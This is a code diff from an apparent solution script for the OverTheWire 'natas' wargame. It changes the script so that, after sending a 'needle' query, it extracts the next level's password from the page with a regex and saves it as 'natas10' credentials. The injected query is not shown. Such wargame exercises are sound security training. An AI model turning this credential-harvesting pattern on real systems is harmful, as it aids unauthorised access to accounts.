@@ -17,7 +17,19 @@ def main():
                 'needle':QUERY
             }
     )
-    print response.content
+    
+    regex = r"<pre>\n(\w+)"
+    matches = re.finditer(regex, response.content, re.MULTILINE)
+
+    password = None
+    for match in matches:
+        password = match.group(1)
+
+    if password is not None:
+        print ('found password: %s' % password)
+        print ('adding to credentials....')
+        natas.save_credentials('natas10', password)
+        print ('done')
 
 if __name__ =='__main__':
     main()
